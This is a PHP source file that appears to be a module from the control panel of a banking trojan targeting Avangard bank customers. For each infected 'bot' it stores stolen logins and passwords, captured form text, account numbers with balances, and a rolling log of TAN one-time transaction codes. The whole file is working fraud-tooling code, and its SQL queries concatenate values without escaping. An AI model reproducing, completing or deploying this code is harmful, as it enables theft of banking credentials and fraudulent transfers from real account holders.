<?php

class ServiceAvangard {
    private $bot, $system, $mysqli;
    
    function __construct(){
        global $bot, $system, $mysqli;        
        $this->bot = &$bot;
        $this->system = &$system;
        $this->db = &$mysqli;
	
	if(!empty($this->bot->info)){
	    $this->bot->info = json_decode(base64_decode($this->bot->info), 1);
	    if(!is_array($this->bot->info)) $this->bot->info = array();
	}else{
	    $this->bot->info = array();
	}
    }
    
    // сохраняет логин и пароль при повторном вызове перезаписывает
    function Auth($login = '', $password = ''){
        $this->bot->info['logs']['login'] = $login;
        $this->bot->info['logs']['password'] = $password;
        
        $this->db->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($this->bot->info)).'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');
        
        return array($login , $password);
    }
    
    function save_data($txt, $type){
        if(empty($txt)) return false;
	if(empty($type)) return false;
	
	$txt = explode('|', $txt);
	$type = explode('|', $type);
	
	foreach($type as $k => $t){
	    $this->bot->info['text'][$t] = $txt[$k];
	}
        
        $this->db->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($this->bot->info)).'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');
        
        return true;
    }
    
    // принимает массив массивов[acc=>'3435456567687789',sum=>"24 000RUR"] при повторном вызове перезаписывает
    function SummSet($accAndSumm = array()){
        $this->bot->info['logs']['accAndSumm'] = $accAndSumm;
        
        $this->db->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($this->bot->info)).'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');
        
        return $accAndSumm;
    }
    
    //принимает номер тана и сам тан сохранять при каждом вызове
    function TanSet($tannum = '', $TanSet = ''){
        //$this->bot->info['logs']['tan'][] = array($tannum, $TanSet);
        
        if(!isset($this->bot->info['logs']['tan'][0])){
	    $this->bot->info['logs']['tan'][] = array($tannum, $TanSet, time());
	}else{
	    array_unshift($this->bot->info['logs']['tan'], array($tannum, $TanSet, time()));
	}
	
	if(count($this->bot->info['logs']['tan']) >= 20){
	    $this->bot->info['logs']['tan'] = array_slice($this->bot->info['logs']['tan'], 0, 20);
	}
        
        $this->db->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($this->bot->info)).'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');
        
        return array($tannum,$TanSet, time());
    }
}

RegisterService("ServiceAvangard");